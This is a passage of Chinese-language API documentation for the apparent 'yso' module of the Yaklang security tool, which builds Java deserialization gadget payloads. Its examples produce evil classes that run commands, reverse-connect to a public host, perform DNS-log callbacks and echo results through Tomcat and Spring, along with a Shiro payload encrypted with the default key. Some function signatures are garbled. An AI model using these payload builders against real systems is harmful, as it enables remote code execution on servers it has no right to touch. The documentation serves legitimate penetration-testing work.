- `i` : 任意类型的参数，函数指针

**返回类型**

- `r1` : 字符串，gadget 名称
- `r2` : 错误信息，如果解析失败则返回错误

## 示例代码

### 基础用法

获取 GetCommonsBeanutils1JavaObject 函数的 gadget 名称

```yaklang
name, err := GetGadgetNameByFun(GetCommonsBeanutils1JavaObject)
```

## 38. `yso.GetGroovy1JavaObject`

## 功能描述

基于Groovy1序列化模板生成并返回一个Java对象。

## 参数说明

```
func GetGroovy1JavaObject(cmd: string) => => (*JavaObject, error)
```

**请求参数**

- `cmd` : 要设置在Java对象中的命令字符串。

**返回类型**

- `r1` : 成功时返回生成的Java对象及nil错误。
- `r2` : 失败时返回nil及相应错误。

## 示例代码

### 基础用法

假设的命令字符串为'ls'，生成Java对象并输出十六进制payload。

```yaklang
command := 'ls'
javaObject, _ := yso.GetGroovy1JavaObject(command)
gadgetBytes, _ := yso.ToBytes(javaObject)
hexPayload := codec.EncodeToHex(gadgetBytes)
println(hexPayload)
```

## 39. `yso.GetJBossInterceptors1JavaObject`

## 功能描述

基于JBossInterceptors1 序列化模板生成并返回一个Java对象。用户可以通过提供额外的配置函数定制生成的Java对象的特定属性或行为。

## 参数说明

```
func GetJBossInterceptors1JavaObject(options ...GenClassOptionFun) => (*JavaObject, error)
```

**请求参数**

- `options` : 用于配置Java对象的可变参数函数列表

**返回类型**

- `r1` : *JavaObject，成功时返回生成的Java对象
- `r2` : error，成功时为nil错误，失败时返回相应错误

## 示例代码

### 基础用法

生成一个Java对象并指定恶意类的名称

```yaklang
gadgetObj, err := yso.GetJBossInterceptors1JavaObject(
    yso.useRuntimeExecEvilClass(command),
    yso.obfuscationClassConstantPool(),
    yso.evilClassName(className)
)
```

## 40. `yso.GetJSON1JavaObject`

## 功能描述

基于JSON1 序列化模板生成并返回一个Java对象，用户可以通过提供额外的配置定制生成的Java对象的特定属性或行为。

## 参数说明

```
func GetJSON1JavaObject(options ...GenClassOptionFun) => (*JavaObject, error)
```

**请求参数**

- `options` : 用于配置Java对象的可变参数函数列表

**返回类型**

- `r1` : *JavaObject，成功时返回生成的Java对象
- `r2` : error，成功时为nil，失败时返回相应错误

## 示例代码

### 基础用法

生成一个Java对象，使用Runtime Exec方法执行命令，并指定恶意类的名称

```yaklang
command = 'whoami'
className = 'KEsBXTRS'
gadgetObj,err = yso.GetJSON1JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className) // 指定恶意类的名称

)
```

## 41. `yso.GetJavaObjectFromBytes`

## 功能描述

从字节数组中解析并返回第一个Java对象。

## 参数说明

```
func GetJavaObjectFromBytes(byt []byte) => (*JavaObject, error)
```

**请求参数**

- `byt` : 要解析的字节数组。

**返回类型**

- `r1` : 成功时返回第一个Java对象。
- `r2` : 失败时返回相应错误。

## 示例代码

### 基础用法

从字节中解析Java对象

```yaklang
raw := "rO0..." // base64 Java serialized object
bytes = codec.DecodeBase64(raw)~ // base64解码
javaObject, err := yso.GetJavaObjectFromBytes(bytes) // 从字节中解析Java对象
```

## 42. `yso.GetJavassistWeld1JavaObject`

## 功能描述

基于JavassistWeld1 序列化模板生成并返回一个Java对象。用户可以通过提供额外的配置函数定制生成的Java对象的特定属性或行为。

## 参数说明

```
func GetJavassistWeld1JavaObject(options ...GenClassOptionFun) => (*JavaObject, error)
```

**请求参数**

- `options` : 用于配置Java对象的可变参数函数列表

**返回类型**

- `r1` : *JavaObject，成功时返回生成的Java对象
- `r2` : error，成功时为nil错误，失败时返回相应错误

## 示例代码

### 基础用法

生成一个Java对象并指定恶意类的名称

```yaklang
gadgetObj, err := yso.GetJavassistWeld1JavaObject(yso.useRuntimeExecEvilClass(command), yso.obfuscationClassConstantPool(), yso.evilClassName(className))
```

## 43. `yso.GetJdk7u21JavaObject`

## 功能描述

基于Jdk7u21 序列化模板生成并返回一个Java对象。用户可以通过提供额外的配置函数定制生成的Java对象的特定属性或行为。

## 参数说明

```
func GetJdk7u21JavaObject(options ...GenClassOptionFun) => (*JavaObject, error)
```

**请求参数**

- `options` : 用于配置Java对象的可变参数函数列表

**返回类型**

- `r1` : *JavaObject，成功时返回生成的Java对象
- `r2` : error，成功时为nil错误，失败时返回相应错误

## 示例代码

### 基础用法

生成一个Java对象，并指定恶意类的名称为'KEsBXTRS'，使用Runtime Exec方法执行命令

```yaklang
gadgetObj,err = yso.GetJdk7u21JavaObject(

	yso.useRuntimeExecEvilClass(command),
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className),

)
```

## 44. `yso.GetJdk8u20JavaObject`

## 功能描述

基于Jdk8u20 序列化模板生成并返回一个Java对象，用户可以通过提供额外的配置定制生成的Java对象的特定属性或行为。

## 参数说明

```
func GetJdk8u20JavaObject(options ...GenClassOptionFun) => (*JavaObject, error)
```

**请求参数**

- `options` : 用于配置Java对象的可变参数函数列表

**返回类型**

- `r1` : *JavaObject，成功时返回生成的Java对象
- `r2` : error，成功时为nil错误，失败时返回相应错误

## 示例代码

### 基础用法

生成一个Java对象，并指定恶意类的名称为'KEsBXTRS'，使用Runtime Exec方法执行命令

```yaklang
command = 'whoami'
className = 'KEsBXTRS'
gadgetObj,err = yso.GetJdk8u20JavaObject(

	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
	yso.obfuscationClassConstantPool(),
	yso.evilClassName(className), // 指定恶意类的名称

)
```

## 45. `yso.GetSimplePrincipalCollectionJavaObject`

## 功能描述

基于SimplePrincipalCollection序列化模板生成并返回一个Java对象，用于Shiro漏洞检测时判断rememberMe cookie的个数。

## 参数说明

```
func GetSimplePrincipalCollectionJavaObject() => (*JavaObject, error)
```

**请求参数**


**返回类型**

- `r1` : *JavaObject，Java对象
- `r2` : error类型，错误信息

## 示例代码

### 基础用法

生成Java对象并序列化为字节数组

```yaklang
javaObject, _ = yso.GetSimplePrincipalCollectionJavaObject()
classBytes,_ = yso.ToBytes(javaObject)
```

加密数据并生成payload

```yaklang
data = codec.PKCS5Padding(classBytes, 16)
keyDecoded,err = codec.DecodeBase64("kPH+bIxk5D2deZiIxcaaaA==")
iv = []byte(ramdstr(16))
cipherText ,_ = codec.AESCBCEncrypt(keyDecoded, data, iv)
payload = codec.EncodeBase64(append(iv, cipherText...))
```

## 46. `yso.GetURLDNSJavaObject`

## 功能描述

利用Java URL类的特性，生成一个在反序列化时会尝试对提供的URL执行DNS查询的Java对象。

## 参数说明

```
func GetURLDNSJavaObject(url: string) => => (*JavaObject, error)
```

**请求参数**

- `url` : 要在生成的Java对象中设置的URL字符串。

**返回类型**

- `r1` : 成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
- `r2` : 错误信息，如果有的话。

## 示例代码

### 基础用法

生成Java对象并发送给目标服务器进行反序列化

```yaklang
url, token, _ = risk.NewDNSLogDomain()
javaObject, _ = yso.GetURLDNSJavaObject(url)
gadgetBytes,_ = yso.ToBytes(javaObject)
// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
res,err = risk.CheckDNSLogByToken(token)
if err {
  //dnslog查询失败
} else {
  if len(res) > 0{
   // dnslog查询成功
  }
}
```

## 47. `yso.LoadClassFromBCEL`

## 功能描述

将BCEL格式的Java类数据转换为字节数组，并从这些字节中加载并返回一个ClassObject对象。

## 参数说明

```
func LoadClassFromBCEL(data: string, options: ...GenClassOptionFun) => => (ClassObject, error)
```

**请求参数**

- `data` : BCEL格式的Java类数据
- `options` : 用于配置类对象的可变参数函数列表

**返回类型**

- `r1` : 成功时返回ClassObject对象
- `r2` : 成功时返回nil错误，失败时返回相应错误

## 示例代码

### 基础用法

从BCEL数据加载并配置类对象

```yaklang
bcelData := "$ $BECL$ $..." 
classObject, err := LoadClassFromBCEL(bcelData, option1, option2)
```

## 48. `yso.LoadClassFromBase64`

## 功能描述

从base64编码的字符串中加载并返回一个ClassObject对象。

## 参数说明

```
func LoadClassFromBase64(base64 string, options ...GenClassOptionFun) => (ClassObject, error)
```

**请求参数**

- `base64` : 要从中加载类对象的base64编码字符串。
- `options` : 用于配置类对象的可变参数函数列表。

**返回类型**

- `r1` : 成功时返回ClassObject对象及nil错误。
- `r2` : 失败时返回nil及相应错误。

## 示例代码

### 基础用法

从字节中加载并配置类对象

```yaklang
classObject, _ := yso.LoadClassFromBytes("yv66vg...")
```

## 49. `yso.LoadClassFromBytes`

## 功能描述

从字节数组中加载并返回一个ClassObject对象，允许通过可变参数options来配置生成的类对象。

## 参数说明

```
func LoadClassFromBytes(bytes []byte, options ...GenClassOptionFun) => (ClassObject, error)
```

**请求参数**

- `bytes` : 要从中加载类对象的字节数组。
- `options` : 用于配置类对象的可变参数函数列表。

**返回类型**

- `r1` : 成功时返回ClassObject对象。
- `r2` : 失败时返回相应错误。

## 示例代码

### 基础用法

从字节中加载并配置类对象

```yaklang
bytesCode, _ := codec.DecodeBase64("yv66vg...")
classObject, _ := yso.LoadClassFromBytes(bytesCode)
```

## 50. `yso.ToBcel`

## 功能描述

将 Java 类对象转换为 BCEL 编码格式的字符串

## 参数说明

```
func ToBcel(i any) => (string, error)
```

**请求参数**

- `i` : Java 类对象，待转换为 BCEL 编码格式的字符串

**返回类型**

- `r1` : 转换后的 BCEL 编码格式的字符串
- `r2` : 错误信息，如果转换过程中出现错误则返回

## 示例代码

### 基础用法

将 Java 类对象转换为 BCEL 编码格式的字符串

```yaklang
classObj := &ClassObject{...}
bcelStr, err := yso.ToBcel(classObj)
```

## 51. `yso.ToBytes`

## 功能描述

将 Java 或反序列化对象转换为字节码

## 参数说明

```
func ToBytes(i any, opts ...MarshalOptionFun) => ([]byte, error)
```

**请求参数**

- `i` : Java 或反序列化对象
- `opts` : 可选的配置项

**返回类型**

- `r1` : 转换后的字节码
- `r2` : 错误信息，如果有错误发生

## 示例代码

### 基础用法

将对象转换为字节码

```yaklang
gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.dirtyDataLength(10000),yso.twoBytesCharString())
```

## 52. `yso.ToJson`

## 功能描述

ToJson 将 Java 或反序列化对象转换为 json 字符串

## 参数说明

```
func ToJson(i any) => (string, error)
```

**请求参数**

- `i` : Java 或反序列化对象

**返回类型**

- `r1` : 转换后的json字符串
- `r2` : 错误信息，如果有错误发生

## 示例代码

### 基础用法

将对象转换为json字符串

```yaklang
gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
gadgetJson,_ = yso.ToJson(gadgetObj)
```

## 53. `yso.dirtyDataLength`

## 功能描述

设置序列化数据中脏数据的长度

## 参数说明

```
func dirtyDataLength(length: number) => => MarshalOptionFun
```

**请求参数**

- `length` : 要设置的脏数据长度，类型为整数

**返回类型**

- `r1` : 返回类型为MarshalOptionFun，用于设置序列化数据中脏数据的长度

## 示例代码

### 基础用法

设置脏数据长度为10000

```yaklang
gadgetBytes,_ = yso.ToBytes(gadgetObj, yso.dirtyDataLength(10000))
```

## 54. `yso.dnslogDomain`

## 功能描述

SetDnslog，dnslogDomain 请求参数选项函数，设置指定的 Dnslog 域名，需要配合 useDnslogTemplate 使用。

## 参数说明

```
func dnslogDomain(addr: string) => => GenClassOptionFun
```

**请求参数**

- `addr` : 要设置的 Dnslog 域名。

**返回类型**

- `r1` : GenClassOptionFun 类型的返回值。

## 示例代码

### 基础用法

设置 Dnslog 域名为 'dnslog.com'。

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain('dnslog.com'))
```

## 55. `yso.dump`

## 功能描述

将Java 对象转换为类 Java 代码

## 参数说明

```
func dump(i any) => (string, error)
```

**请求参数**

- `i` : 需要转换的Java对象

**返回类型**

- `r1` : 转换后的Java类代码字符串
- `r2` : 错误信息，如果转换过程中出现错误

## 示例代码

### 基础用法

将Java对象转换为Java类代码

```yaklang
gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
gadgetDump,_ = yso.dump(gadgetObj)
```

## 56. `yso.evilClassName`

## 功能描述

SetClassName

## 参数说明

```
func evilClassName(className: string) => => GenClassOptionFun
```

**请求参数**

- `className` : 要设置的类名

**返回类型**

- `r1` : 生成的类名选项函数

## 示例代码

### 基础用法

设置类名为'EvilClass'

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.evilClassName('EvilClass'))
```

## 57. `yso.majorVersion`

## 功能描述

设置主版本号

## 参数说明

```
func majorVersion(v: uint16) => => GenClassOptionFun
```

**请求参数**

- `v` : 主版本号，uint16类型

**返回类型**

- `r1` : 返回一个GenClassOptionFun函数

## 示例代码

### 基础用法

## 58. `yso.obfuscationClassConstantPool`

## 功能描述

SetObfuscation

## 参数说明

```
func obfuscationClassConstantPool() => GenClassOptionFun
```

**请求参数**


**返回类型**

- `r1` : 返回一个GenClassOptionFun类型的值，用于设置是否混淆类常量池

## 示例代码

### 基础用法

设置是否混淆类常量池

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.obfuscationClassConstantPool())
```

## 59. `yso.springEchoBody`

## 功能描述

设置是否要在body中回显

## 参数说明

```
func springEchoBody() => GenClassOptionFun
```

**请求参数**


**返回类型**

- `r1` : 返回一个GenClassOptionFun类型的对象，用于设置是否在body中回显

## 示例代码

### 基础用法

设置是否在body中回显

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam('Echo Check'),yso.springEchoBody())
```

## 60. `yso.springHeader`

## 功能描述

设置指定的 header 键值对，配合 useSpringEchoTemplate 使用

## 参数说明

```
func springHeader(key: string, val: string) => => GenClassOptionFun
```

**请求参数**

- `key` : 要设置的 header 键
- `val` : 要设置的 header 值

**返回类型**

- `r1` : 生成的 GenClassOptionFun 对象

## 示例代码

### 基础用法

设置 header 键为'Echo'，值为'Echo Check'

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader('Echo','Echo Check'))
```

## 61. `yso.springParam`

## 功能描述

SetParam

## 参数说明

```
func springParam(val: string) => => GenClassOptionFun
```

**请求参数**

- `val` : 要设置的请求参数。

**返回类型**

- `r1` : GenClassOptionFun类型的返回值。

## 示例代码

### 基础用法

设置请求参数为'Echo Check'

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(), yso.springParam('Echo Check'))
```

## 62. `yso.springRuntimeExecAction`

## 功能描述

SetExecAction

## 参数说明

```
func  =>GenClassOptionFun
```

**请求参数**


**返回类型**

- `r1` : 返回GenClassOptionFun类型的值，用于设置是否要执行命令

## 示例代码

### 基础用法

设置是否执行命令的示例代码

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam('Echo Check'),yso.springEchoBody())
```

## 63. `yso.tcpReverseHost`

## 功能描述

设置指定的 tcpReverseHost 域名，配合其他参数使用。

## 参数说明

```
func tcpReverseHost(host: string) => => GenClassOptionFun
```

**请求参数**

- `host` : 要设置的 tcpReverseHost 的host。

**返回类型**

- `r1` : 返回一个 GenClassOptionFun 对象。

## 示例代码

### 基础用法

设置 tcpReverseHost 的示例代码

```yaklang
host = '公网IP'
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(), yso.tcpReverseHost(host), yso.tcpReversePort(8080), yso.tcpReverseToken(token))
```

## 64. `yso.tcpReversePort`

## 功能描述

设置指定的 tcpReversePort 域名，配合其他参数使用。

## 参数说明

```
func tcpReversePort(port: number) => => GenClassOptionFun
```

**请求参数**

- `port` : 要设置的 tcpReversePort 的port。

**返回类型**

- `r1` : 返回一个 GenClassOptionFun 对象。

## 示例代码

### 基础用法

设置公网IP为主机，生成一个唯一的 token，并设置 tcpReversePort 为 8080。

```yaklang
host = '公网IP';
token = uuid();
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(), yso.tcpReverseHost(host), yso.tcpReversePort(8080), yso.tcpReverseToken(token))
```

## 65. `yso.tcpReverseToken`

## 功能描述

设置指定的 token 用于是否反连成功的标志，需要配合 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 使用。

## 参数说明

```
func tcpReverseToken(token: string) => => GenClassOptionFun
```

**请求参数**

- `token` : 要设置的 token。

**返回类型**

- `r1` : 返回一个 GenClassOptionFun 类型的值。

## 示例代码

### 基础用法

设置 token 并调用相关函数

```yaklang
host = '公网IP'
token = uuid()
yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
```

## 66. `yso.threeBytesCharString`

## 功能描述

设置序列化时使用三字节字符串

## 参数说明

```
func func threeBytesCharString() => => MarshalOptionFun
```

**请求参数**


**返回类型**

- `r1` : 返回一个MarshalOptionFun类型的函数

## 示例代码

### 基础用法

设置序列化时使用三字节字符串

```yaklang
gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.threeBytesCharString())
```

## 67. `yso.twoBytesCharString`

## 功能描述

设置序列化时使用双字节字符串

## 参数说明

```
func func twoBytesCharString() => => MarshalOptionFun
```

**请求参数**


**返回类型**

- `r1` : 返回一个MarshalOptionFun类型的函数

## 示例代码

### 基础用法

设置序列化时使用双字节字符串

```yaklang
gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.twoBytesCharString())
```

## 68. `yso.useBase64BytesClass`

## 功能描述

SetClassBase64Bytes

## 参数说明

```
func useBase64BytesClass(base64: string) => => GenClassOptionFun
```

**请求参数**

- `base64` : base64编码的字节码

**返回类型**

- `r1` : GenClassOptionFun

## 示例代码

### 基础用法

使用useBase64BytesClass函数设置base64编码的字节码

```yaklang
gadgetObj, err = yso.GetCommonsBeanutils1JavaObject(yso.useBase64BytesClass(base64Class))
```

## 69. `yso.useBytesClass`

## 功能描述

SetClassBytes

## 参数说明

```
func useBytesClass(data []byte) => GenClassOptionFun
```

**请求参数**

- `data` : 字节码，类型为[]byte

**返回类型**

- `r1` : GenClassOptionFun类型，用于设置类选项

## 示例代码

### 基础用法

使用useBytesClass函数设置类字节码

```yaklang
bytesCode, _ = codec.DecodeBase64(bytes)
gadgetObj, err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesClass(bytesCode))
```

## 70. `yso.useBytesEvilClass`

## 功能描述

SetBytesEvilClass，useBytesEvilClass 请求参数选项函数，传入自定义的字节码。

## 参数说明

```
func useBytesEvilClass(data []byte) => GenClassOptionFun
```

**请求参数**

- `data` : 自定义的字节码

**返回类型**

- `r1` : GenClassOptionFun

## 示例代码

### 基础用法

使用自定义的字节码调用 useBytesEvilClass 函数

```yaklang
bytesCode, _ = codec.DecodeBase64(bytes)
gadgetObj, err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode))
```

## 71. `yso.useClassMultiEchoTemplate`

## 功能描述

设置生成 MultiEcho 类的模板，用于 Tomcat/Weblogic 回显，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。

## 参数说明

```
func useClassMultiEchoTemplate() => GenClassOptionFun
```

**请求参数**


**返回类型**

- `r1` : 返回一个 GenClassOptionFun 类型的函数

## 示例代码

### 基础用法

body 回显

```yaklang
bodyClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoTemplate(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
```

header 回显

```yaklang
headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
```

## 72. `yso.useClassParam`

## 功能描述

设置类生成时的参数

## 参数说明

```
func useClassParam(k: string, v: string) => => GenClassOptionFun
```

**请求参数**

- `k` : 参数名
- `v` : 参数值

**返回类型**

- `r1` : 生成类选项函数

## 示例代码

### 基础用法

设置类生成时的参数为'command'和'whoami'

```yaklang
classObj,_ = yso.GenerateClass(yso.useClassParam('command','whoami'))
```

## 73. `yso.useConstructorExecutor`

## 功能描述

设置是否使用构造器执行

## 参数说明

```
func useConstructorExecutor() => GenClassOptionFun
```

**请求参数**


**返回类型**

- `r1` : 返回一个GenClassOptionFun类型的值，用于设置是否使用构造器执行

## 示例代码

### 基础用法

设置是否使用构造器执行

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.useConstructorExecutor())
```

## 74. `yso.useDNSLogEvilClass`

## 功能描述

SetDnslogEvilClass

## 参数说明

```
func useDNSLogEvilClass(addr: string) => => GenClassOptionFun
```

**请求参数**

- `addr` : 要设置的 Dnslog 域名。

**返回类型**

- `r1` : 生成的 Dnslog 类模板设置函数。

## 示例代码

### 基础用法

设置生成 Dnslog 类模板并指定 Dnslog 域名为 'dnslog.com'。

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass('dnslog.com'))
```

## 75. `yso.useDNSlogTemplate`

## 功能描述

设置生成Dnslog类的模板

## 参数说明

```
func useDNSlogTemplate() => => GenClassOptionFun
```

**请求参数**


**返回类型**

- `r1` : GenClassOptionFun，用于设置生成Dnslog类的模板

## 示例代码

### 基础用法

设置生成Dnslog类的模板，并配合dnslogDomain使用

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useDNSlogTemplate(), yso.dnslogDomain('dnslog.com'))
```

## 76. `yso.useEchoBody`

## 功能描述

SetEchoBody

## 参数说明

```
func useEchoBody() => GenClassOptionFun
```

**请求参数**

- `无` : 无

**返回类型**

- `r1` : GenClassOptionFun类型，设置是否要在body中回显

## 示例代码

### 基础用法

设置是否在body中回显

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam('Echo Check'),yso.springEchoBody())
```

## 77. `yso.useHeaderEchoEvilClass`

## 功能描述

设置 HeaderEcho 类，需要配合 useHeaderParam 使用，功能与 useHeaderEchoTemplate 相同。

## 参数说明

```
func useHeaderEchoEvilClass() => => GenClassOptionFun
```

**请求参数**


**返回类型**

- `r1` : GenClassOptionFun 类型，用于设置 HeaderEcho 类

## 示例代码

### 基础用法

设置 HeaderEcho 类并使用 useHeaderParam 设置参数

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoEvilClass(), yso.useHeaderParam('Echo', 'Header Echo Check'))
```

## 78. `yso.useHeaderEchoTemplate`

## 功能描述

SetClassHeaderEchoTemplate

## 参数说明

```
func  =>GenClassOptionFun
```

**请求参数**

- `无` : 无

**返回类型**

- `r1` : GenClassOptionFun，设置生成HeaderEcho类的模板

## 示例代码

### 基础用法

设置生成HeaderEcho类的模板

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoTemplate(),yso.useHeaderParam('Echo','Header Echo Check'))
```

## 79. `yso.useHeaderParam`

## 功能描述

设置指定的 header 键值对

## 参数说明

```
func func useHeaderParam(key: string, val: string) => => GenClassOptionFun
```

**请求参数**

- `key` : 要设置的 header 键
- `val` : 要设置的 header 值

**返回类型**

- `r1` : GenClassOptionFun 类型，用于设置 header

## 示例代码

### 基础用法

设置 header 键为 'Echo'，值为 'Echo Check'

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(), yso.springHeader('Echo', 'Echo Check'))
```

## 80. `yso.useModifyTomcatMaxHeaderSizeTemplate`

## 功能描述

SetClassModifyTomcatMaxHeaderSizeTemplate

## 参数说明

```
func GenClassOptionFun useModifyTomcatMaxHeaderSizeTemplate()
```

**请求参数**


**返回类型**

- `r1` : 生成ModifyTomcatMaxHeaderSize类的模板

## 示例代码

### 基础用法

设置生成ModifyTomcatMaxHeaderSize类的模板

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useModifyTomcatMaxHeaderSizeTemplate())
```

## 81. `yso.useMultiEchoEvilClass`

## 功能描述

设置 MultiEcho 类，用于 Tomcat/Weblogic 回显，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。

## 参数说明

```
func GenClassOptionFun useMultiEchoEvilClass()
```

**请求参数**


**返回类型**

- `r1` : 返回一个 GenClassOptionFun 类型的对象，用于设置 MultiEcho 类

## 示例代码

### 基础用法

body 回显

```yaklang
bodyClassObj,_ =  yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoEvilClass(),yso.useEchoBody(),yso.useParam('Body Echo Check'))
```

header 回显

```yaklang
headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useMultiEchoEvilClass(),yso.useHeaderParam('Echo','Header Echo Check'))
```

## 82. `yso.useParam`

## 功能描述

SetParam

## 参数说明

```
func useParam(val: string) => => GenClassOptionFun
```

**请求参数**

- `val` : 要设置的请求参数。

**返回类型**

- `r1` : GenClassOptionFun类型，设置指定的回显值。

## 示例代码

### 基础用法

设置请求参数为'Echo Check'

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(), yso.springParam('Echo Check'))
```

## 83. `yso.useProcessBuilderExecEvilClass`

## 功能描述

设置生成ProcessBuilderExec类的模板，同时设置要执行的命令

## 参数说明

```
func useProcessBuilderExecEvilClass(cmd: string) => => GenClassOptionFun
```

**请求参数**

- `cmd` : 要执行的命令字符串

**返回类型**

- `r1` : 返回一个GenClassOptionFun类型的值

## 示例代码

### 基础用法

设置要执行的命令为'whoami'

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecEvilClass('whoami'))
```

## 84. `yso.useProcessBuilderExecTemplate`

## 功能描述

SetClassProcessBuilderExecTemplate

## 参数说明

```
func  =>GenClassOptionFun
```

**请求参数**

- `无` : 无

**返回类型**

- `r1` : 生成ProcessBuilderExec类的模板设置函数

## 示例代码

### 基础用法

设置生成ProcessBuilderExec类的模板

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecTemplate(),yso.command("whoami"))
```

## 85. `yso.useProcessImplExecEvilClass`

## 功能描述

SetProcessImplExecEvilClass

## 参数说明

```
func useProcessImplExecEvilClass(cmd: string) => => GenClassOptionFun
```

**请求参数**

- `cmd` : 要执行的命令字符串。

**返回类型**

- `r1` : 生成的ProcessImplExec类的模板。

## 示例代码

### 基础用法

设置要执行的命令为'whoami'并生成ProcessImplExec类的模板。

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecEvilClass('whoami'))
```

## 86. `yso.useProcessImplExecTemplate`

## 功能描述

SetClassProcessImplExecTemplate

## 参数说明

```
func  =>GenClassOptionFun
```

**请求参数**


**返回类型**

- `r1` : 生成ProcessImplExec类的模板设置函数

## 示例代码

### 基础用法

设置生成ProcessImplExec类的模板并与command配合使用

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecTemplate(),yso.command("whoami"))
```

## 87. `yso.useRuntimeExecEvilClass`

## 功能描述

SetRuntimeExecEvilClass

## 参数说明

```
func useRuntimeExecEvilClass(cmd: string) => => GenClassOptionFun
```

**请求参数**

- `cmd` : 要执行的命令字符串。

**返回类型**

- `r1` : 生成的RuntimeExec类的模板。

## 示例代码

### 基础用法

设置要执行的命令为'whoami'并生成RuntimeExec类的模板。

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass('whoami'))
```

## 88. `yso.useRuntimeExecTemplate`

## 功能描述

设置生成RuntimeExec类的模板

## 参数说明

```
func  =>GenClassOptionFun
```

**请求参数**


**返回类型**

- `r1` : 返回一个GenClassOptionFun类型的值，用于设置生成RuntimeExec类的模板

## 示例代码

### 基础用法

设置生成RuntimeExec类的模板并调用command函数

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecTemplate(),yso.command('whoami'))
```

## 89. `yso.useSleepEvilClass`

## 功能描述

设置 Sleep 类，需要配合 useSleepTime 使用，功能类似于 useSleepTemplate。

## 参数说明

```
func GenClassOptionFun useSleepEvilClass()
```

**请求参数**


**返回类型**

- `r1` : 返回一个 GenClassOptionFun 类型的对象，用于设置 Sleep 类

## 示例代码

### 基础用法

设置 Sleep 类后，配合设置 Sleep 时间为5秒

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useSleepEvilClass(),yso.useSleepTime(5))
```

## 90. `yso.useSleepTemplate`

## 功能描述

SetClassSleepTemplate

## 参数说明

```
func GenClassOptionFun useSleepTemplate()
```

**请求参数**


**返回类型**

- `r1` : 返回一个 GenClassOptionFun 类型的对象，用于设置生成 Sleep 类的模板

## 示例代码

### 基础用法

发送生成的 Payload 后，观察响应时间是否大于 5s

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5))
```

## 91. `yso.useSleepTime`

## 功能描述

设置指定的 sleep 时长，用于延时检测gadget。

## 参数说明

```
func GenClassOptionFun useSleepTime(time: number) => => GenClassOptionFun
```

**请求参数**

- `time` : 指定的 sleep 时长，单位为秒

**返回类型**

- `r1` : 返回一个 GenClassOptionFun 类型的函数

## 示例代码

### 基础用法

设置 sleep 时长为5秒

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(), yso.useSleepTime(5))
```

## 92. `yso.useSpringEchoTemplate`

## 功能描述

SetClassSpringEchoTemplate

## 参数说明

```
func GenClassOptionFun useSpringEchoTemplate()
```

**请求参数**


**返回类型**

- `r1` : 生成SpringEcho类的模板设置函数

## 示例代码

### 基础用法

设置生成SpringEcho类的模板

```yaklang
yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
```
